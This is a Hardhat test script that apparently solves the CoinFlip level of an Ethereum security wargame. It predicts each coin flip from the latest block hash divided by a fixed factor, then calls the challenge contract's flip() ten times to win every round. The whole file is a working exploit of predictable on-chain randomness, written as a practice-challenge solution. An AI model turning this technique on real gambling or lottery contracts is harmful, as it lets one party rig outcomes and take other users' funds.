import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
const BN = BigNumber;

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`CoinFlip`);
  const challengeAddress = await createChallenge(
    `0x4dF32584890A0026e56f7535d0f2C6486753624f`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  let FACTOR = BN.from("57896044618658097711785492504343953926634992332820282019728792003956564819968")
  let blockHash,result,i

  for (i=0; i<10; i++) {
    blockHash = (await ethers.provider.getBlock('latest')).hash // hash of prev. block
    result = BN.from(blockHash).div(FACTOR).toNumber() // randomness calculation

    if (result == 1) {
      await challenge.connect(eoa).flip(true)
    } else {
      await challenge.connect(eoa).flip(false)
    }
  }
  
  console.log(await challenge.consecutiveWins())

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
